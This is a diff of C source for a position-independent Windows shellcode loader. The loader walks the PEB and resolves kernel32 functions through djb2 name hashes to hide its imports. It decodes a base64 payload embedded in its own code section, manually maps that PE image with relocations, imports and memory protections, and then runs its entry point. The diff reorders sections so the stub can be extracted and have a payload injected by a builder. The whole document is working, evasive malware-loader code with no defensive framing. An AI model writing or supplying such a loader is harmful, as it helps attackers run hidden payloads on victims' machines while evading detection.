@@ -1,7 +1,8 @@
 #include <windows.h>
 #include <winternl.h>
 
-// Forward declarations
+// 1. Entry Point MUST BE FIRST IN SOURCE
+void Entry();
 void LoaderEntry();
 unsigned long HashString(const char* str);
 unsigned long HashStringW(const WCHAR* str, size_t len);
@@ -10,6 +11,20 @@ FARPROC GetFuncAddr(HMODULE hMod, unsigned long hash);
 int GetB64Val(char c);
 size_t B64Decode(const char* in, BYTE* out);
 ULONG_PTR GetRIP(void);
+
+__attribute__((section(".text$00"))) void Entry() {
+    LoaderEntry();
+}
+
+__attribute__((section(".text$01"))) __attribute__((noinline)) ULONG_PTR GetRIP(void) {
+    ULONG_PTR ret;
+    __asm__ (
+        "call 1f\n"
+        "1: pop %0\n"
+        : "=r"(ret)
+    );
+    return ret;
+}
 
 // Redefine structures for PIC
 typedef struct _MY_LDR_DATA_TABLE_ENTRY {
@@ -36,18 +51,11 @@ typedef struct _RELOC_ENTRY {
     WORD Type : 4;
 } RELOC_ENTRY, *PRELOC_ENTRY;
 
-// Placeholder for the base64 payload.
-// The builder will replace this string.
-// We put it in the .text section so we can find it relatively.
-__attribute__((section(".text"))) const char payload_b64[] = "---PAYLOAD_PLACEHOLDER---";
-
-void LoaderEntry() {
+__attribute__((section(".text$02"))) void LoaderEntry() {
     API_TABLE api;
-    // kernel32.dll = 0x7040ee75
-    HMODULE hK32 = GetModBase(0x7040ee75);
+    HMODULE hK32 = GetModBase(0x7040ee75); // kernel32.dll
     if (!hK32) return;
 
-    // LoadLibraryA = 0x5fbff0fb, GetProcAddress = 0xcf31bb1f, VirtualAlloc = 0x382c0f97, VirtualFree = 0x69dbd17d, VirtualProtect = 0x10066f1f
     api.LoadLibraryA = (void*)GetFuncAddr(hK32, 0x5fbff0fb);
     api.GetProcAddress = (void*)GetFuncAddr(hK32, 0xcf31bb1f);
     api.VirtualAlloc = (void*)GetFuncAddr(hK32, 0x382c0f97);
@@ -56,17 +64,13 @@ void LoaderEntry() {
 
     if (!api.LoadLibraryA || !api.GetProcAddress || !api.VirtualAlloc) return;
 
-    // To be truly PIC, we need to find payload_b64 relatively.
-    // However, since it's in .text, we can use GetRIP and search for the placeholder prefix "---PAYLOAD"
     ULONG_PTR rip = GetRIP();
     const char* p = (const char*)rip;
     while (1) {
-        if (*(DWORD*)p == 0x2d2d2d2d && *(DWORD*)(p+4) == 0x4c594150) break; // "----" and "PAYL"
+        if (*(DWORD*)p == 0x3a444c50) break; // "PLD:"
         p++;
     }
-    // Skip prefix "---PAYLOAD_PLACEHOLDER---" is replaced by "---PAYLOAD:..."
-    while (*p != ':') p++;
-    p++; // Now p points to the base64 string
+    p += 4;
 
     size_t b64_len = 0;
     while (p[b64_len] != '-' && p[b64_len] != 0) b64_len++;
@@ -79,13 +83,11 @@ void LoaderEntry() {
     if (dos->e_magic != IMAGE_DOS_SIGNATURE) return;
     PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(raw + dos->e_lfanew);
 
-    BYTE* base = (BYTE*)api.VirtualAlloc(NULL, nt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    BYTE* base = (BYTE*)api.VirtualAlloc((LPVOID)nt->OptionalHeader.ImageBase, nt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!base) base = (BYTE*)api.VirtualAlloc(NULL, nt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!base) return;
 
-    // Copy headers
     for (DWORD i = 0; i < nt->OptionalHeader.SizeOfHeaders; i++) base[i] = raw[i];
-
-    // Copy sections
     PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
     for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
         BYTE* dest = base + sec[i].VirtualAddress;
@@ -93,9 +95,8 @@ void LoaderEntry() {
         for (DWORD j = 0; j < sec[i].SizeOfRawData; j++) dest[j] = src[j];
     }
 
-    // Relocations
     IMAGE_DATA_DIRECTORY rDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
-    if (rDir.Size > 0) {
+    if (rDir.Size > 0 && (ULONG_PTR)base != nt->OptionalHeader.ImageBase) {
         ULONG_PTR delta = (ULONG_PTR)(base - nt->OptionalHeader.ImageBase);
         PIMAGE_BASE_RELOCATION rel = (PIMAGE_BASE_RELOCATION)(base + rDir.VirtualAddress);
         while (rel->VirtualAddress != 0) {
@@ -109,7 +110,6 @@ void LoaderEntry() {
         }
     }
 
-    // Imports
     IMAGE_DATA_DIRECTORY iDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
     if (iDir.Size > 0) {
         PIMAGE_IMPORT_DESCRIPTOR imp = (PIMAGE_IMPORT_DESCRIPTOR)(base + iDir.VirtualAddress);
@@ -129,7 +129,6 @@ void LoaderEntry() {
         }
     }
 
-    // Set protections
     sec = IMAGE_FIRST_SECTION(nt);
     for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
         DWORD old, prot = PAGE_READONLY;
@@ -138,32 +137,18 @@ void LoaderEntry() {
         api.VirtualProtect(base + sec[i].VirtualAddress, sec[i].Misc.VirtualSize, prot, &old);
     }
 
-    // Execute
-    if (nt->OptionalHeader.AddressOfEntryPoint) {
-        ((void(*)())(base + nt->OptionalHeader.AddressOfEntryPoint))();
-    }
-
+    if (nt->OptionalHeader.AddressOfEntryPoint) ((void(*)())(base + nt->OptionalHeader.AddressOfEntryPoint))();
     api.VirtualFree(raw, 0, MEM_RELEASE);
 }
 
-// Helper functions
-__attribute__((noinline)) ULONG_PTR GetRIP(void) {
-    ULONG_PTR ret;
-    __asm__ (
-        "mov (%%rsp), %0\n"
-        : "=r"(ret)
-    );
-    return ret;
-}
-
-unsigned long HashString(const char* str) {
+__attribute__((section(".text$03"))) unsigned long HashString(const char* str) {
     unsigned long hash = 5381;
     int c;
     while ((c = *str++)) hash = ((hash << 5) + hash) + c;
     return hash;
 }
 
-unsigned long HashStringW(const WCHAR* str, size_t len) {
+__attribute__((section(".text$04"))) unsigned long HashStringW(const WCHAR* str, size_t len) {
     unsigned long hash = 5381;
     for (size_t i = 0; i < len; i++) {
         WCHAR c = str[i];
@@ -173,7 +158,7 @@ unsigned long HashStringW(const WCHAR* str, size_t len) {
     return hash;
 }
 
-HMODULE GetModBase(unsigned long hash) {
+__attribute__((section(".text$05"))) HMODULE GetModBase(unsigned long hash) {
     PPEB peb;
 #if defined(_M_X64) || defined(__x86_64__)
     peb = (PPEB)__readgsqword(0x60);
@@ -190,7 +175,7 @@ HMODULE GetModBase(unsigned long hash) {
     return NULL;
 }
 
-FARPROC GetFuncAddr(HMODULE hMod, unsigned long hash) {
+__attribute__((section(".text$06"))) FARPROC GetFuncAddr(HMODULE hMod, unsigned long hash) {
     PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hMod;
     PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)hMod + dos->e_lfanew);
     PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hMod + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
@@ -203,7 +188,7 @@ FARPROC GetFuncAddr(HMODULE hMod, unsigned long hash) {
     return NULL;
 }
 
-int GetB64Val(char c) {
+__attribute__((section(".text$07"))) int GetB64Val(char c) {
     if (c >= 'A' && c <= 'Z') return c - 'A';
     if (c >= 'a' && c <= 'z') return c - 'a' + 26;
     if (c >= '0' && c <= '9') return c - '0' + 52;
@@ -212,7 +197,7 @@ int GetB64Val(char c) {
     return -1;
 }
 
-size_t B64Decode(const char* in, BYTE* out) {
+__attribute__((section(".text$08"))) size_t B64Decode(const char* in, BYTE* out) {
     size_t i = 0, j = 0;
     while (in[i]) {
         int v1 = GetB64Val(in[i++]);
@@ -228,3 +213,6 @@ size_t B64Decode(const char* in, BYTE* out) {
     }
     return j;
 }
+
+// 4. PAYLOAD PLACEHOLDER AT THE END
+__attribute__((section(".text$zz"))) const char payload_b64[] = "---PAYLOAD_PLACEHOLDER---";
